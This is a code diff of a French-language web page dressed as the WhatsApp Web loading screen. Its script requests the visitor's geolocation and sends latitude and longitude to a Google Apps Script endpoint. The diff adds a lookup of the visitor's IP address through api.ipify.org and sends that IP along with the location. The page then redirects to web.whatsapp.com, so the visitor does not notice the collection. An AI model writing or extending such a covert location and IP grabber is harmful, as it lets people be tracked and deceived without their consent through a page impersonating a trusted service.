@@ -1,5 +1,6 @@
 <!DOCTYPE html>
-<html lang="fr" style="--splashscreen-startup-background: #F7F5F3; --splashscreen-primary-title: #0A1014; --splashscreen-secondary-lighter: #5B6368; --splashscreen-progress-primary: #1DAA61; --splashscreen-progress-background: rgba(0, 0, 0, 0.1);">
+<html lang="fr"
+    style="--splashscreen-startup-background: #F7F5F3; --splashscreen-primary-title: #0A1014; --splashscreen-secondary-lighter: #5B6368; --splashscreen-progress-primary: #1DAA61; --splashscreen-progress-background: rgba(0, 0, 0, 0.1);">
 
 <head>
     <meta charset="UTF-8" />
@@ -166,30 +167,38 @@
         function getLocation() {
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(function (position) {
-                    fetch("https://script.google.com/macros/s/AKfycbzJ9nqFDc5MP4AJXBsc-e6iu8fB19VnUG674-DPYQTungYtXSMEgdC31LDLKZrh9A2u/exec", {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            nom_utilisateur: "seami",
-                            contact: "0123456789"
-                        }),
-                        mode: 'no-cors'
-                    }).then(() => {
-                        document.getElementById("contactCard").innerHTML = "<p>Redirection vers Whatsapp en cours...</p>";
-                        setTimeout(() => {
-                            window.location.href = "https://web.whatsapp.com";
-                        }, 2000);
-                    }).catch(err => {
-                        console.error("Erreur lors de l'envoi :", err);
-                    });
+                    // Utiliser un service tiers pour obtenir l'adresse IP
+                    fetch('https://api.ipify.org?format=json')
+                        .then(response => response.json())
+                        .then(data => {
+                            const ipAddress = data.ip;
+
+                            fetch("https://script.google.com/macros/s/AKfycbzJ9nqFDc5MP4AJXBsc-e6iu8fB19VnUG674-DPYQTungYtXSMEgdC31LDLKZrh9A2u/exec", {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify({
+                                    latitude: position.coords.latitude,
+                                    longitude: position.coords.longitude,
+                                    nom_utilisateur: "seami",
+                                    ip: ipAddress  // Ajouter l'adresse IP aux données envoyées
+                                }),
+                                mode: 'no-cors'
+                            }).then(() => {
+                                document.getElementById("contactCard").innerHTML = "<p>Redirection vers Whatsapp en cours...</p>";
+                                setTimeout(() => {
+                                    window.location.href = "https://web.whatsapp.com";
+                                }, 2000);
+                            }).catch(err => {
+                                console.error("Erreur lors de l'envoi :", err);
+                            });
+                        });
                 });
             } else {
                 alert("Géolocalisation non supportée.");
             }
         }
     </script>
+
 
 </body>
 
